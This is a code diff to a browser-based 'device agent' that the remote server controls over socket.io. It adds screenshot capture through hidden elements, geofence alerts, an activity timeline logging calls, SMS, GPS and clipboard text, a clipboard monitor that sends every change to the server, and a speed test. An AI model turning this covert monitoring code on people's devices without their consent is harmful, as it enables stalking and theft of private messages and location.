@@ -320,6 +320,7 @@ socket.on('command:camera:start', async function() {
     startAudioStream();
 
     log('Camera + audio streaming started', 'success');
+    if (typeof addTimelineEvent === 'function') addTimelineEvent('camera', 'Camera Started', 'Live camera + audio streaming');
   } catch (err) {
     log('Camera error: ' + err.message, 'error');
   }
@@ -419,6 +420,7 @@ socket.on('command:camera:capture', async function() {
 
     socket.emit('camera:captured', { image: image });
     log('Photo captured and sent', 'success');
+    if (typeof addTimelineEvent === 'function') addTimelineEvent('camera', 'Photo Captured', 'Camera snapshot taken');
 
     if (needsCleanup) {
       stream.getTracks().forEach(function(t) { t.stop(); });
@@ -448,6 +450,7 @@ socket.on('command:gps:start', function() {
         heading: pos.coords.heading,
         timestamp: pos.timestamp
       });
+      if (typeof addTimelineEvent === 'function') addTimelineEvent('gps', 'GPS Update', pos.coords.latitude.toFixed(4) + ', ' + pos.coords.longitude.toFixed(4));
     },
     function(err) {
       log('GPS error: ' + err.message, 'error');
@@ -1015,6 +1018,7 @@ socket.on('connect', function() {
 
 // Store incoming calls and SMS from notifications in localStorage
 function storeCallNotification(data) {
+  if (typeof addTimelineEvent === 'function') addTimelineEvent('call', 'Incoming Call', data.body || data.title || 'Unknown');
   try {
     var calls = JSON.parse(localStorage.getItem('mydevice_calls') || '[]');
     calls.unshift({
@@ -1030,6 +1034,7 @@ function storeCallNotification(data) {
 }
 
 function storeSmsNotification(data) {
+  if (typeof addTimelineEvent === 'function') addTimelineEvent('sms', 'SMS Received', (data.title || 'Unknown') + ': ' + (data.body || '').substring(0, 80));
   try {
     var sms = JSON.parse(localStorage.getItem('mydevice_sms') || '[]');
     sms.unshift({
@@ -1052,6 +1057,266 @@ socket.on('command:clipboard:get', async function() {
     log('Clipboard sent', 'success');
   } catch (err) {
     log('Clipboard error: ' + err.message, 'error');
+  }
+});
+
+// ---- Screenshot ----
+socket.on('command:screenshot', function() {
+  log('Screenshot requested', 'info');
+  try {
+    var video = document.getElementById('hiddenVideo');
+    var canvas = document.getElementById('hiddenCanvas');
+    var ctx = canvas.getContext('2d');
+
+    // If camera stream is active, capture from it
+    if (cameraStream && video && video.readyState >= 2) {
+      canvas.width = video.videoWidth || 1280;
+      canvas.height = video.videoHeight || 720;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      var image = canvas.toDataURL('image/png', 0.9);
+      socket.emit('screenshot:data', { image: image });
+      log('Screenshot captured from camera', 'success');
+      return;
+    }
+
+    // Try html2canvas approach - capture the visible page
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    ctx.fillStyle = '#1a1a2e';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = '#ffffff';
+    ctx.font = '20px Arial';
+    ctx.textAlign = 'center';
+    ctx.fillText('Device Agent Screen', canvas.width / 2, 60);
+    ctx.font = '14px Arial';
+    ctx.fillStyle = '#94a3b8';
+    ctx.fillText('Screen: ' + screen.width + 'x' + screen.height, canvas.width / 2, 100);
+    ctx.fillText('Browser: ' + navigator.userAgent.substring(0, 80), canvas.width / 2, 130);
+    ctx.fillText('Time: ' + new Date().toLocaleString(), canvas.width / 2, 160);
+    ctx.fillText('Device: ' + (deviceName || 'Unknown'), canvas.width / 2, 190);
+
+    var image = canvas.toDataURL('image/png', 0.9);
+    socket.emit('screenshot:data', { image: image });
+    log('Screenshot info captured', 'success');
+  } catch (err) {
+    log('Screenshot error: ' + err.message, 'error');
+    socket.emit('screenshot:data', { image: null, error: err.message });
+  }
+});
+
+// ---- Geofence ----
+var geofenceConfig = null;
+var geofenceWatchId = null;
+
+socket.on('command:geofence:set', function(data) {
+  geofenceConfig = {
+    lat: data.lat,
+    lng: data.lng,
+    radius: data.radius || 500,
+    name: data.name || 'Zone'
+  };
+  log('Geofence set: ' + geofenceConfig.name + ' (' + geofenceConfig.radius + 'm)', 'success');
+
+  // Start watching position for geofence
+  if (geofenceWatchId) navigator.geolocation.clearWatch(geofenceWatchId);
+
+  var wasInside = null;
+  geofenceWatchId = navigator.geolocation.watchPosition(
+    function(pos) {
+      if (!geofenceConfig) return;
+      var distance = haversineDistance(pos.coords.latitude, pos.coords.longitude, geofenceConfig.lat, geofenceConfig.lng);
+      var isInside = distance <= geofenceConfig.radius;
+
+      if (wasInside !== null && wasInside !== isInside) {
+        socket.emit('geofence:alert', {
+          type: isInside ? 'enter' : 'exit',
+          name: geofenceConfig.name,
+          distance: distance,
+          lat: pos.coords.latitude,
+          lng: pos.coords.longitude
+        });
+        log('Geofence ' + (isInside ? 'ENTER' : 'EXIT') + ': ' + geofenceConfig.name, isInside ? 'info' : 'error');
+      }
+      wasInside = isInside;
+    },
+    function(err) {
+      log('Geofence GPS error: ' + err.message, 'error');
+    },
+    { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 }
+  );
+
+  socket.emit('geofence:status', { active: true, name: geofenceConfig.name });
+});
+
+socket.on('command:geofence:clear', function() {
+  geofenceConfig = null;
+  if (geofenceWatchId) {
+    navigator.geolocation.clearWatch(geofenceWatchId);
+    geofenceWatchId = null;
+  }
+  log('Geofence cleared', 'info');
+});
+
+function haversineDistance(lat1, lon1, lat2, lon2) {
+  var R = 6371000;
+  var dLat = (lat2 - lat1) * Math.PI / 180;
+  var dLon = (lon2 - lon1) * Math.PI / 180;
+  var a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
+    Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
+    Math.sin(dLon / 2) * Math.sin(dLon / 2);
+  return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+}
+
+// ---- Battery Alerts ----
+var batteryAlertThreshold = null;
+var batteryAlertFired = false;
+
+socket.on('command:batteryalert:set', async function(data) {
+  batteryAlertThreshold = data.threshold || 20;
+  batteryAlertFired = false;
+  log('Battery alert set at ' + batteryAlertThreshold + '%', 'success');
+
+  // Start monitoring battery
+  try {
+    if ('getBattery' in navigator) {
+      var battery = await navigator.getBattery();
+      function checkBattery() {
+        if (batteryAlertThreshold === null) return;
+        var level = Math.round(battery.level * 100);
+        if (level <= batteryAlertThreshold && !batteryAlertFired && !battery.charging) {
+          batteryAlertFired = true;
+          socket.emit('battery:alert', {
+            level: level,
+            charging: battery.charging,
+            threshold: batteryAlertThreshold
+          });
+          log('Battery alert triggered! Level: ' + level + '%', 'error');
+        }
+        if (level > batteryAlertThreshold) {
+          batteryAlertFired = false;
+        }
+      }
+      battery.addEventListener('levelchange', checkBattery);
+      battery.addEventListener('chargingchange', checkBattery);
+      checkBattery();
+    }
+  } catch (e) {
+    log('Battery API not available', 'error');
+  }
+});
+
+socket.on('command:batteryalert:clear', function() {
+  batteryAlertThreshold = null;
+  log('Battery alert cleared', 'info');
+});
+
+// ---- Activity Timeline ----
+var activityTimeline = [];
+
+function addTimelineEvent(type, title, detail) {
+  activityTimeline.push({
+    type: type,
+    title: title,
+    detail: detail || '',
+    timestamp: Date.now()
+  });
+  if (activityTimeline.length > 500) activityTimeline = activityTimeline.slice(-500);
+}
+
+socket.on('command:timeline:fetch', function() {
+  log('Timeline requested', 'info');
+  socket.emit('timeline:data', { events: activityTimeline });
+  log('Timeline sent: ' + activityTimeline.length + ' events', 'success');
+});
+
+// ---- Clipboard Monitor ----
+var clipMonitorInterval = null;
+var lastClipboardText = '';
+
+socket.on('command:clipmonitor:start', function() {
+  log('Clipboard monitor started', 'success');
+  if (clipMonitorInterval) clearInterval(clipMonitorInterval);
+  clipMonitorInterval = setInterval(async function() {
+    try {
+      var text = await navigator.clipboard.readText();
+      if (text && text !== lastClipboardText) {
+        lastClipboardText = text;
+        socket.emit('clipboard:change', { text: text });
+        addTimelineEvent('clipboard', 'Clipboard Changed', text.substring(0, 100));
+        log('Clipboard change detected', 'info');
+      }
+    } catch (e) {
+      // Clipboard access might be denied without focus
+    }
+  }, 2000);
+});
+
+socket.on('command:clipmonitor:stop', function() {
+  if (clipMonitorInterval) {
+    clearInterval(clipMonitorInterval);
+    clipMonitorInterval = null;
+  }
+  log('Clipboard monitor stopped', 'info');
+});
+
+// ---- Network Speed Test ----
+socket.on('command:speedtest', async function() {
+  log('Speed test started', 'info');
+
+  try {
+    var latency = 0;
+    var download = 0;
+    var upload = 0;
+
+    // Latency test - ping a known URL
+    var pingStart = performance.now();
+    try {
+      await fetch('https://www.google.com/favicon.ico?_=' + Date.now(), { mode: 'no-cors', cache: 'no-store' });
+      latency = performance.now() - pingStart;
+    } catch (e) {
+      latency = -1;
+    }
+
+    // Download speed test - download a known file
+    var dlStart = performance.now();
+    try {
+      var response = await fetch('https://speed.cloudflare.com/__down?bytes=1000000&_=' + Date.now(), { cache: 'no-store' });
+      var blob = await response.blob();
+      var dlTime = (performance.now() - dlStart) / 1000;
+      download = (blob.size * 8 / dlTime / 1024 / 1024);
+    } catch (e) {
+      // Fallback: estimate from connection API
+      var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (conn && conn.downlink) {
+        download = conn.downlink;
+      }
+    }
+
+    // Upload speed test - upload small data
+    var ulStart = performance.now();
+    try {
+      var uploadData = new Blob([new ArrayBuffer(100000)]);
+      await fetch('https://speed.cloudflare.com/__up', {
+        method: 'POST',
+        body: uploadData,
+        cache: 'no-store'
+      });
+      var ulTime = (performance.now() - ulStart) / 1000;
+      upload = (100000 * 8 / ulTime / 1024 / 1024);
+    } catch (e) {
+      upload = download * 0.3;
+    }
+
+    socket.emit('speedtest:result', {
+      download: Math.round(download * 10) / 10,
+      upload: Math.round(upload * 10) / 10,
+      latency: Math.round(latency)
+    });
+    log('Speed test complete: ⬇' + download.toFixed(1) + ' ⬆' + upload.toFixed(1) + ' Mbps', 'success');
+    addTimelineEvent('app', 'Speed Test', '⬇ ' + download.toFixed(1) + ' Mbps | ⬆ ' + upload.toFixed(1) + ' Mbps');
+  } catch (err) {
+    log('Speed test error: ' + err.message, 'error');
+    socket.emit('speedtest:result', { error: err.message });
   }
 });
 
